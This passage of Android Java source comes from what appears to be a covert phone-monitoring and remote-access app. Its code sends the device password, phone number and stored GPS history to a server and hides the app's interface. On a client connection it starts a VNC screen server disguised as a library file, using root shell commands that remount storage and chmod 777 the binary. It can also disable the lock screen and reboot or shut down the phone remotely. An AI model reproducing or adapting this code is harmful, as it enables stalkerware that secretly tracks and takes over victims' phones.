    		str_adminEmail = str_adminEmail.replace("&", "");
    	}
    	else {
    		str_adminEmail = "NONE";
    	}
    	
    	return strOS + "@" + strGPSLongi + "@" + strGPSLati + "@" + strPasswd + "@" + strPhoneNum + "@" + str_adminPhone + "@" + str_adminEmail;
    }
	
    public static void j_on_register_result(int comments_id, boolean approved, boolean allow_hide)
    {
    	if (_instance == null) {
    		return;
    	}
    	
    	if (allow_hide)
    	{
    		AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ALLOW_HIDE_UI, 1);
    		if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_USB_ROOT_INSTALL, 0))
    		{
    			AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 1);
    			HomeActivity.DoHideUi(_instance);
    		}
    	}
        else {
        	AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ALLOW_HIDE_UI, 0);
        	//AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0);
        	//HomeActivity.DoShowUi(_instance);
        }
    	
    	Message msg = _instance.mMainHandler.obtainMessage(UI_MSG_DISPLAY_CAMERA_ID, comments_id, (approved ? 1 : 0));
    	_instance.mMainHandler.sendMessage(msg);
    	
    	
    	//尝试从数据库取出定位数据put到服务器
    	final int MAX_LOC_ITEM_COUNT = 100;
    	int nItemCount = 0;
    	String strItems = "";
    	
    	try {///////////////////////////////////////////////////////////
    	
    	DatabaseHelper dbHelper = new DatabaseHelper(_instance);
    	SQLiteDatabase db = dbHelper.getWritableDatabase();
    	
    	Cursor cursor = db.query("location_save", new String[]{"loc_time", "longitude", "latitude"}, null, null, null, null, "loc_time", null);
    	while (cursor != null && cursor.moveToNext())
    	{
    		int loc_time = cursor.getInt(0);
    		double longitude = cursor.getDouble(1);
    		double latitude = cursor.getDouble(2);
    		
    		nItemCount += 1;
    		strItems += String.format("%d,%.4f,%.4f-", loc_time, longitude, latitude);
    		
    		if (nItemCount >= MAX_LOC_ITEM_COUNT) {
    			long curr_time = System.currentTimeMillis() / 1000;  //Seconds
    			int ret = _instance.NativePutLocation((int)curr_time, nItemCount, strItems);
    			Log.d("PutLocation", "Full NativePutLocation:(" + curr_time + "," + nItemCount + "," + strItems + ") = " + ret);
    			nItemCount = 0;
    			strItems = "";
    			if (ret == 1)//OK
    			{
    				db.delete("location_save", "loc_time<=?", new String[]{"" + loc_time + ""});
    			}
    			else {
    				break;
    			}
    		}
    	}
    	//记录读完了，最后不够MAX_LOC_ITEM_COUNT个数
    	if (nItemCount > 0) {
    		long curr_time = System.currentTimeMillis() / 1000;  //Seconds
    		int ret = _instance.NativePutLocation((int)curr_time, nItemCount, strItems);
    		Log.d("PutLocation", "Partial NativePutLocation:(" + curr_time + "," + nItemCount + "," + strItems + ") = " + ret);
			nItemCount = 0;
			strItems = "";
			if (ret == 1)//OK
			{
				db.delete("location_save", "1", null);
			}
    	}

    	db.close();
    	
    	} catch (Exception e) {e.printStackTrace();}////////////////////////////////////
    }
    
    public static void j_on_register_network_error()
    {
    	if (_instance == null) {
    		return;
    	}
    	
    	double locationLongitude = _instance.mLocLongitude;
    	double locationLatitude = _instance.mLocLatitude;
    	
    	if (Math.abs(_instance.mBaiduLongitude) >= 0.01 || Math.abs(_instance.mBaiduLatitude) >= 0.01) {
    		locationLongitude = _instance.mBaiduLongitude;
    		locationLatitude = _instance.mBaiduLatitude;
    	}
    	if (Math.abs(locationLongitude) < 0.01 && Math.abs(locationLatitude) < 0.01) {
    		return;
    	}
    	
    	long curr_time = System.currentTimeMillis() / 1000;  //Seconds
    	
    	try {/////////////////////////////////////////////////////////
    	
    	DatabaseHelper dbHelper = new DatabaseHelper(_instance);
    	SQLiteDatabase db = dbHelper.getWritableDatabase();
    	
    	Cursor cursor = db.query("location_save", new String[]{"loc_time", "longitude", "latitude"}, null, null, null, null, "loc_time desc", "1");
    	if (cursor != null && cursor.moveToNext())
    	{
    		int loc_time = cursor.getInt(0);
    		double longitude = cursor.getDouble(1);
    		double latitude = cursor.getDouble(2);
    		if (curr_time - loc_time > 3600 || 
    				Math.abs(locationLongitude - longitude) > 0.001 || 
    				Math.abs(locationLatitude - latitude) > 0.001) {
    			
		    	ContentValues values = new ContentValues();
		    	values.put("loc_time", (int)curr_time);
		    	values.put("longitude", locationLongitude);
		    	values.put("latitude", locationLatitude);
		    	db.insert("location_save", null, values);
		    	
		    	Log.d("PutLocation", "More insert: (" + curr_time + "," + locationLongitude + "," + locationLatitude + ")");
    		}
    		else {
    			Log.d("PutLocation", "Skip: (" + curr_time + "," + locationLongitude + "," + locationLatitude + ")");
    		}
    	}
    	else {
	    	ContentValues values = new ContentValues();
	    	values.put("loc_time", (int)curr_time);
	    	values.put("longitude", locationLongitude);
	    	values.put("latitude", locationLatitude);
	    	db.insert("location_save", null, values);
	    	
	    	Log.d("PutLocation", "First insert: (" + curr_time + "," + locationLongitude + "," + locationLatitude + ")");
    	}

    	db.close();
    	
    	} catch (Exception e) {e.printStackTrace();}////////////////////////////////////
    }
    
    public static void j_on_client_connected()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.m_isClientConnected = true;
    	
    	_instance.startVNCServer();
    	
    	if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
    	{
    		_instance.mMainHandler.post(new Runnable(){
    			@Override
    			public void run() {
    				SharedFuncLib.MyMessageTip(_instance, _instance.getResources().getString(R.string.msg_on_client_connected));
    			}
    		});
    		
    		try {
	    		Vibrator mVibrator = (Vibrator) _instance.getSystemService(Service.VIBRATOR_SERVICE);
	    		mVibrator.vibrate(800);
    		} catch (Exception e) {	}
    	}
    }
    
    public static void j_on_client_disconnected()
    {
    	if (_instance == null) {
    		return;
    	}
    	_instance.m_isClientConnected = false;
    	
    	//_instance.killVNCServer();
    	
    	//屏幕不再保持高亮
        _instance.m_wl.release();
		PowerManager pm = (PowerManager)_instance.getSystemService(Context.POWER_SERVICE);
		_instance.m_wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PARTIAL_WAKE_LOCK");
		_instance.m_wl.acquire();
    	
    	if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
    	{
    		_instance.mMainHandler.post(new Runnable(){
    			@Override
    			public void run() {
    				SharedFuncLib.MyMessageTip(_instance, _instance.getResources().getString(R.string.msg_on_client_disconnected));
    			}
    		});
    		
    		try {
	    		Vibrator mVibrator = (Vibrator) _instance.getSystemService(Service.VIBRATOR_SERVICE);
	    		mVibrator.vibrate(800);
    		} catch (Exception e) {	}
    	}
    }
    
    public static void j_mc_arm()//屏幕锁屏
    {
    	if (_instance == null) {
    		return;
    	}
    	
    	try {
	    	KeyguardManager keyguardManager = (KeyguardManager)_instance.getSystemService(KEYGUARD_SERVICE);
	        KeyguardLock lock = keyguardManager.newKeyguardLock(KEYGUARD_SERVICE);
	        lock.reenableKeyguard();
	        
	        //屏幕不再保持高亮
	        _instance.m_wl.release();
			PowerManager pm = (PowerManager)_instance.getSystemService(Context.POWER_SERVICE);
			_instance.m_wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PARTIAL_WAKE_LOCK");
			_instance.m_wl.acquire();
    	} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
    
    public static void j_mc_disarm()//屏幕解锁
    {
    	if (_instance == null) {
    		return;
    	}
    	
    	try {
    		//点亮屏幕
    		_instance.m_wl.release();
    		PowerManager pm = (PowerManager)_instance.getSystemService(Context.POWER_SERVICE);
    		_instance.m_wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.SCREEN_DIM_WAKE_LOCK, "ACQUIRE_CAUSES_WAKEUP|SCREEN_DIM_WAKE_LOCK");
    		_instance.m_wl.acquire();
    		
	    	KeyguardManager keyguardManager = (KeyguardManager)_instance.getSystemService(KEYGUARD_SERVICE);
	        KeyguardLock lock = keyguardManager.newKeyguardLock(KEYGUARD_SERVICE);
	        lock.disableKeyguard();
	    } catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
    
    public static void j_contrl_system_reboot()
    {
    	try {
    		File tf = null;
    		tf = new File("/system/xbin/reboot");
    		if (tf.exists()) {
    			runNativeShellCmd("su -c \"/system/xbin/reboot\"");
    			return;
    		}
    		tf = new File("/system/bin/reboot");
    		if (tf.exists()) {
    			runNativeShellCmd("su -c \"/system/bin/reboot\"");
    			return;
    		}
    		runNativeShellCmd("su -c \"reboot\"");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
    
    public static void j_contrl_system_shutdown()
    {
    	try {
    		File tf = null;
    		tf = new File("/system/xbin/shutdown");
    		if (tf.exists()) {
    			runNativeShellCmd("su -c \"/system/xbin/shutdown\"");
    			return;
    		}
    		tf = new File("/system/bin/shutdown");
    		if (tf.exists()) {
    			runNativeShellCmd("su -c \"/system/bin/shutdown\"");
    			return;
    		}
    		tf = new File("/system/xbin/reboot");
    		if (tf.exists()) {
    			runNativeShellCmd("su -c \"/system/xbin/reboot -p\"");
    			return;
    		}
    		tf = new File("/system/bin/reboot");
    		if (tf.exists()) {
    			runNativeShellCmd("su -c \"/system/bin/reboot -p\"");
    			return;
    		}
    		runNativeShellCmd("su -c \"shutdown\"");
    		runNativeShellCmd("su -c \"reboot -p\"");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
    
    public void startVNCServer() {
		// Lets see if i need to boot daemon...
		try {
			Process sh;
			String files_dir = "/data/data/" + getPackageName() + "/";
			if (MobileCameraService.m_bNormalInstall) {
				files_dir = getFilesDir().getAbsolutePath();
				Log.d(TAG, "getFilesDir() = " + files_dir);
			}
			
			String password_check = " -p " + SharedFuncLib.SYS_TEMP_PASSWORD;
			String other_string = " -r 0";
			other_string += " -s 100";
			
			int method = AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_CAPMETHOD, 0);
			if (1 == method) {
				other_string += " -m adb";
			}
			else if (2 == method) {
				other_string += " -m flinger";
			}
			else if (3 == method) {
				other_string += " -m fb";
			}
			//other_string += " -m flinger -I -z";//adb,flinger,fb
			other_string += " -A " + Build.VERSION.SDK;
			
			String libpath_string = "";
			if (MobileCameraService.m_bNormalInstall) {
				libpath_string = " -L " + getFilesDir().getParent() + "/lib/";
			} else {
				libpath_string = " -L " + "/system/lib/";
			}
			
			//our exec file is disguised as a library so it will get packed to lib folder according to cpu_abi
			String droidvncserver_exec = null;
			if (MobileCameraService.m_bNormalInstall) {
				if (Build.VERSION.SDK_INT >= 21) {
					//Android-5.0 must use PIE
					droidvncserver_exec = getFilesDir().getParent() + "/lib/libandroidvncserver_pie.so";
				}
				else {
					droidvncserver_exec = getFilesDir().getParent() + "/lib/libandroidvncserver.so";
				}
			} else {
				if (Build.VERSION.SDK_INT >= 21) {
					//Android-5.0 must use PIE
					droidvncserver_exec = "/system/lib/libandroidvncserver_pie.so";
				}
				else {
					droidvncserver_exec = "/system/lib/libandroidvncserver.so";
				}
			}
			
			File f = new File(droidvncserver_exec);
			if (!f.exists())
			{
				Log.d(TAG, "Warning! Could not find daemon file, " + droidvncserver_exec);
				libpath_string = " -L " + "/system/app/MobileCamera/lib/arm/";
				droidvncserver_exec   =   "/system/app/MobileCamera/lib/arm/libandroidvncserver_pie.so";
				f = new File(droidvncserver_exec);
				if (!f.exists())
				{
				Log.d(TAG, "Error! Could not find daemon file, " + droidvncserver_exec);
				return;
				}
			}
			
 
 			String remount_asec_string = "mount -o rw,dirsync,nosuid,nodev,noatime,remount /mnt/asec/" + getPackageName() + "-1";
			String permission_string = "chmod 777 " + droidvncserver_exec;
			String server_string = droidvncserver_exec  + " " + password_check + " " + other_string + " " + libpath_string + " ";
 
			boolean root = true;
			root &= hasRootPermission();
 
			if (root)     
			{ 
				Log.d(TAG, "Running as root...");
				//if (Build.VERSION.SDK_INT >= 23) {//Android-6.0
				//	Runtime.getRuntime().exec("su 0 " + permission_string);
				//	Runtime.getRuntime().exec("su 0 " + server_string,null,new File(files_dir));
				//}
				//else {
				runNativeShellCmd("su -c \"" + remount_asec_string + "\"");
				runNativeShellCmd("su -c \"" + permission_string + "\"");
				runNativeShellCmdNoWait("su -c \"" + server_string + "\"");
				//}
			}
			else
			{
				Log.d(TAG, "Not running as root...");
				runNativeShellCmd(permission_string);
				runNativeShellCmdNoWait(server_string);
			}
			// dont show password on logcat
			Log.d(TAG, "Starting " + droidvncserver_exec  + " " + password_check+ " " + other_string + " " + libpath_string + " ");

		} catch (Exception e) {
			Log.d(TAG, "startVNCServer():" + e.getMessage());
			final String fstr = "startVNCServer():" + e.getMessage();
			if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
	    	{
	    		_instance.mMainHandler.post(new Runnable(){
	    			@Override
	    			public void run() {
	    				SharedFuncLib.MyMessageTip(_instance, fstr);
	    			}
	    		});
	    	}
		}
	}
    
	public void killVNCServer()
	{
		try {
			LocalSocket clientSocket = new LocalSocket();
			clientSocket.setSoTimeout(100);
			
			String toSend = "~KILL|";
			byte[] buffer = toSend.getBytes();

			LocalSocketAddress addr =  new LocalSocketAddress("unix_13132");
			clientSocket.connect(addr);
			
			OutputStream os = clientSocket.getOutputStream();
			os.write(buffer);
			os.flush();
			os.close();
			clientSocket.close();
		} catch (Exception e) {
			Log.d(TAG, "killVNCServer():" + e.getMessage());
			final String fstr = "killVNCServer():" + e.getMessage();
			if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
	    	{
	    		_instance.mMainHandler.post(new Runnable(){
	    			@Override
	    			public void run() {
	    				SharedFuncLib.MyMessageTip(_instance, fstr);
	    			}
	    		});
	    	}
		}
	}
	
	private static void writeCommand(OutputStream os, String command) throws Exception {
		os.write((command + "\n").getBytes("ASCII"));
	}
	
	public static boolean j_should_do_upnp()
	{
		if (_instance == null) {
    		return false;
    	}
		try {
			ConnectivityManager connManager = (ConnectivityManager)_instance.getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
			if (mWifi.isConnected()) {
				return true;
			}
			else {
				return false;
			}
		} catch (Exception e) {
			return false;
		}
	}
	
	
    ///////////////////////////////////////////////////////////////////////////////////////
    public native void SetThisObject();
    public native int StartNativeMain(String str_client_charset, String str_client_lang, String str_app_package_name);
    public native void StopNativeMain();
    public native void StartDoConnection();
    public native void StopDoConnection();
    
	//public native int NativeSendEmail(String toEmail, String subject, String content);
	//public native int NativePutLocation(int put_time, int num, String strItems);
    
    public native void TLVSendUpdateValue(int tlv_type, double val, boolean send_now);
    public native int PutAudioData(byte[] data, int len);
    public native int PutVideoData(byte[] data, int len, int format, int width, int height, int fps);
    public native int SetHWVideoParam(int width, int height, int fps);
    
    public static native boolean hasRootPermission();
    public static native void runNativeShellCmd(String cmd);
    public static native void runNativeShellCmdNoWait(String cmd);
    
    ///////////////////////////////////////////////////////////////////////////////////////
    static {
        System.loadLibrary("up2p"); //The first
        System.loadLibrary("shdir");//The second
        System.loadLibrary("avrtp");//The third
    }
}
